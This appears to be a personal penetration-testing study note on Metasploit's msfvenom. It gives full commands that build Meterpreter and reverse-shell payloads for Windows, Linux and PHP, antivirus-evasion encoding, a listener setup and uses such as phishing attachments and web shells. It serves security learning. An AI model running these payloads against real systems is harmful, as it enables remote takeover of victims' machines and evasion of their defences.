**`msfvenom`** is a powerful tool within the Metasploit Framework used to **generate payloads**, **encode them**, and **package them** into various formats (e.g., executables, scripts, shellcode). It is commonly used during **exploitation** and **post-exploitation** phases of penetration testing.

---

## 🎯 Purpose of `msfvenom`

- Generate **custom payloads** for specific platforms (Windows, Linux, Web)
- Create **reverse shells**, **bind shells**, and **Meterpreter sessions**
- Embed payloads into files (EXE, DLL, shellcode, etc.)
- Bypass basic antivirus through **encoding** or **obfuscation**
- Test exploit delivery and payload behavior

---

## 🧠 `msfvenom` Syntax

```bash
msfvenom -p <payload> LHOST=<IP> LPORT=<port> -f <format> -o <output_file>
```

|Flag|Description|
|---|---|
|`-p`|Payload to generate|
|`LHOST`|Local (attacker) IP address|
|`LPORT`|Port to connect back to|
|`-f`|Output format (`exe`, `elf`, `raw`, `c`, etc.)|
|`-o`|Output file name (optional)|
|`-e`|Encoder to use (optional)|
|`-b`|Bad characters to avoid|
|`--platform`|Target platform (e.g., Windows, Linux)|
|`--arch`|Target architecture (x86, x64)|

---

## 📦 Common Payloads

|Payload Name|Description|
|---|---|
|`windows/meterpreter/reverse_tcp`|Meterpreter session over reverse TCP|
|`windows/shell/reverse_tcp`|Basic reverse shell|
|`linux/x86/meterpreter_reverse_tcp`|Linux Meterpreter payload|
|`cmd/unix/reverse_bash`|Bash reverse shell|
|`php/meterpreter_reverse_tcp`|PHP script with Meterpreter|
|`java/meterpreter/reverse_tcp`|Java-based payload|

---

## 🛠 Examples

### 1. Windows Reverse Shell EXE
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.2 LPORT=4444 -f exe -o shell.exe
```

### 2. Linux Reverse Shell ELF
```
msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=4444 -f elf > shell.elf
chmod +x shell.elf
```

### 3. PHP Web Shell Payload
```
msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=4444 -f raw > shell.php
```

### 4. Inject Shellcode into C Source
```
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.2 LPORT=4444 -f c
```

## 🔐 Encoding Payloads

To obfuscate and evade basic AV:
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.2 LPORT=4444 -f exe -e x86/shikata_ga_nai -i 5 -o encoded.exe
```

|Flag|Description|
|---|---|
|`-e`|Encoder (`x86/shikata_ga_nai`, `generic/none`)|
|`-i`|Number of iterations|

> 🔥 **Note:** Encoding ≠ encryption. It helps evade **static signature detection**, not sandboxing.

---

## ⚠️ Bad Characters

Avoid problematic characters (e.g., null bytes, newlines):
```
-b '\x00\x0a\x0d'
```

## 🎯 Listener Setup (Metasploit Console)
```
msfconsole
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.10.14.2
set LPORT 4444
exploit
```

## 📘 Real-World Use Cases

|Use Case|Payload & Format|
|---|---|
|Phishing attachment|`.exe`, `.docm` with macro downloader|
|Web shell injection|`.php` or `.jsp` script|
|Reverse shell in buffer overflow|Raw shellcode (`-f c`, `-f python`)|
|Malware dropper simulation|Encoded payload for AV evasion|

---

## 🔗 Related Topics

- [[Metasploit]]
- [[Post-Exploitation]]
- [[Privilege Escalation]]
- [[Payload Delivery Techniques]]
- [[Antivirus Evasion]]

---

## 🏷 Suggested Tags

#msfvenom #payloads #meterpreter #post_exploitation #reverse_shell #red_team #exploit_dev

---

## ✅ To Do

-  Create test payloads for Windows, Linux, PHP, and macros
-  Test payload execution in isolated lab environment
-  Combine payloads with delivery techniques (HTA, macro, DLL)
-  Measure detection rate using VirusTotal or sandbox
